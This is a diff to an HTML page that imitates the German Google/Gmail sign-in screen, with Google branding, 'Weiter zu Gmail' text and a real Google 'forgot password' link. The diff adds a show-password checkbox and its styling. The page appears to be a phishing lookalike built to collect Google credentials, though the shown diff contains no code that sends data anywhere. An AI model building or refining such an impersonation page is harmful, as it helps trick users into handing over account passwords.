@@ -159,9 +159,29 @@
   border-radius: 50px;
   display: none;
 }
+#togglePassword {
+  position: absolute;
+  width: 100px;
+  left: 135px;
+  top: 870px;
+  font-family: helvetica;
+  text-decoration: none;
+  color: #0b57cd;
+  display: none;
+  transform: scale(2.3);
+  border-radius: 0px;
+}
+#togglePasswordLabel {
+  position: absolute;
+  top: 860px;
+  font-size: 30px;
+  left: 130px;
+  display: none;
+  font-family: helvetica;
+}
 </style>
 <body>
-<img class="google" src="IMG_0196.jpeg">
+<img class="google" src="image.jpeg">
 <h1 id ="login" class="login">Anmeldung</h1>
 <h1 id="welcome"class ="welcome">Willkommen</h1>
 <p id="continue" class="continue">Weiter zu Gmail</p>
@@ -176,6 +196,8 @@
 <p id="emailPreview"></p>
 <p id="confirm">Best&auml;tigen Sie Ihre Identit&auml;t, um fortzufahren</p>
 <a href="https://accounts.google.com/v3/signin/challenge/totp?TL=ALoj5Aq2KRnn4_LfIhc8jAKL_7cG5PIAUxV3QDFyIA-TuLsE2M2zKpm4xw3XSYOV&checkConnection=youtube%3A329&checkedDomains=youtube&cid=6&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F686%2F%3Flogin%3D1&ddm=0&flowEntry=AddSession&flowName=GlifWebSignIn&hl=de&pstMsg=1&service=mail" id="forgotpass">Passwort vergessen?</a>
+<input type="checkbox" id="togglePassword">
+        <label id="togglePasswordLabel"for="togglePassword">Passwort anzeigen</label>
 <script>
 function onClick(){
 document.getElementById('email').style.display = "none";
@@ -190,12 +212,25 @@ document.getElementById('confirm').style.display = "block";
 document.getElementById('emailPreview').style.display = "block";
 document.getElementById('forgotpass').style.display = "block";
 document.getElementById('submit').style.display = "block";
+document.getElementById('togglePassword').style.display = "block";
+document.getElementById('togglePasswordLabel').style.display = "block";
 };
   const emailInput = document.getElementById('email');
         const emailPreview = document.getElementById('emailPreview');
 emailInput.addEventListener('input', function() {
             // Update the preview element with the current value of the input
             emailPreview.textContent = emailInput.value;
+        });
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('pass');
+
+        togglePassword.addEventListener('change', function () {
+            // Check if the checkbox is checked
+            if (this.checked) {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
         });
 </script>
 </body>
